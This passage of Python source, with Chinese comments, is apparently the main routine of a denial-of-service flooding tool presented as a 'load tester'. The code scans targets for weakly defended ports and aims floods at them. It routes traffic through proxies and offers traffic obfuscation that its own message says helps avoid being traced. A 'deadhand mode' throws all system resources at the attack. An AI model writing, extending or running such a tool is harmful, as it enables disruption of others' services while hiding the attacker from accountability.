╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ░░░╚═╝░░░╚══════╝╚═════╝░░░░╚═╝░░░
""")

    # 显示管理员状态
    if platform.system() == 'Windows':
        if is_admin():
            admin_msg = "[OK] 已以管理员权限运行，性能已优化"
            logger.info(admin_msg)
            print(Fore.GREEN + admin_msg)
        else:
            admin_msg = "[!] 未以管理员权限运行，部分优化功能受限"
            logger.warning(admin_msg)
            print(Fore.YELLOW + admin_msg)

    print(Fore.YELLOW + "使用 Ctrl+C 可随时停止攻击并查看统计信息\n")

    try:
        targets, targets_ports, config = OperationConsole.config()
        logger.info(f"配置加载完成: 目标数={len(targets)}, 协议={config['protocol']}")

        # 显示端口扫描结果
        print(Fore.CYAN + "\n端口扫描结果:")
        for target, ports in targets_ports.items():
            print(Fore.CYAN + f"  目标: {target}")
            if ports:
                print(Fore.CYAN + f"    防御最薄弱的端口: {', '.join(ports)}")
            else:
                print(Fore.CYAN + f"    未发现薄弱端口")

        # 根据扫描结果调整攻击配置
        if all(len(ports) == 0 for ports in targets_ports.values()):
            # 如果所有目标都没有发现薄弱端口，使用原有配置
            print(Fore.YELLOW + "所有目标均未发现薄弱端口，将使用默认配置进行攻击")
        else:
            # 否则，调整端口（保留用户选择的协议）
            original_protocol = config['protocol']  # 保存用户原始选择的协议
            print(Fore.CYAN + f"保持用户选择的协议: {original_protocol}")

            for target, ports in targets_ports.items():
                if ports:
                    # 取风险最高的一个端口
                    port = int(ports[0])

                    # 显示建议的协议（但不修改用户选择）
                    suggested_protocol = original_protocol
                    if port == 80 or port == 443:
                        suggested_protocol = 'http'
                    elif port == 21:
                        suggested_protocol = 'tcp'  # ftp 使用 tcp
                    elif port == 53:
                        suggested_protocol = 'udp'  # dns 使用 udp

                    if suggested_protocol != original_protocol:
                        print(
                            Fore.YELLOW + f"提示: 端口 {port} 通常使用 {suggested_protocol} 协议，但将按您的设置使用 {original_protocol}")

                    print(Fore.GREEN + f"目标 {target} 将使用 {original_protocol} 协议攻击 {port} 端口")

                    # 调整目标 URL，使用用户选择的协议
                    if '://' not in target:
                        target = f"{original_protocol}://{target}:{port}"
                    else:
                        target = f"{original_protocol}://{target.split('://')[1].split('/')[0]}:{port}"

        tester = LoadTester(
            targets=targets,
            request_size=config['request_size'],
            concurrency=config['concurrency'],
            timeout=config['timeout'],
            protocol=config['protocol'],
            proxies=config['proxies'],
            duration=config['duration'],
            deadhand_mode=config.get('deadhand_mode', False)  # 死手模式设置
        )

        # 应用高级混淆设置
        if 'obfuscation' in config and config['obfuscation']:
            obfuscation_msg = "已启用高级流量混淆，将帮助防止追踪"
            logger.info(obfuscation_msg)
            print(Fore.GREEN + obfuscation_msg)
            tester.enable_random_delay = config.get('enable_random_delay', True)
            tester.enable_path_randomization = config.get('enable_path_randomization', True)
            tester.enable_param_randomization = config.get('enable_param_randomization', True)

        # 应用高级性能设置
        if 'dynamic_concurrency' in config:
            tester.dynamic_concurrency = config['dynamic_concurrency']
        if 'max_concurrency' in config and not config.get('deadhand_mode', False):
            tester.max_concurrency = config['max_concurrency']

        # 如果启用了死手模式，显示警告信息
        if config.get('deadhand_mode', False):
            deadhand_msg = "[!!] 死手模式已激活 - 系统将使用全部资源 [!!]"
            logger.warning(deadhand_msg)
            print(Fore.RED + "\n" + "!" * 60)
            print(Fore.RED + deadhand_msg)
            print(Fore.RED + "!" * 60)

        # 如果设置了持续时间，创建一个主线程计时器
        if config['duration'] is not None:
            def stop_after_duration():
                time.sleep(config['duration'])
                logger.info(f"达到预设时间 {config['duration']} 秒，停止攻击")
                tester.stop_attack()


            timer = threading.Thread(target=stop_after_duration)
            timer.daemon = True
            timer.start()
            tester.threads.append(timer)

        # 强制启用键盘中断处理
        if platform.system() == 'Windows':
            # Windows系统上的特殊处理
            def force_enable_interrupts():
                while not tester.should_stop.is_set():
                    try:
                        time.sleep(0.1)
                    except KeyboardInterrupt:
                        logger.info("检测到键盘中断")
                        tester.stop_attack()
                        break


            interrupt_handler = threading.Thread(target=force_enable_interrupts)
            interrupt_handler.daemon = True
            interrupt_handler.start()
            tester.threads.append(interrupt_handler)

        # 在主线程中运行攻击
        tester.start()
    except Exception as e:
        error_msg = f"程序发生错误: {str(e)}"
        logger.error(error_msg, exc_info=True)
        print(Fore.RED + error_msg)
        # 打印完整的错误堆栈
        import traceback

        traceback.print_exc()
    finally:
        # 最终清理
        try:
            # 强制垃圾回收
            gc.collect()
            logger.info("程序结束，执行最终清理")
        except:
            pass

        # 添加按任意键退出的功能
        print(Fore.YELLOW + "\n按任意键关闭窗口...", end="", flush=True)
        input()  # 等待用户按任意键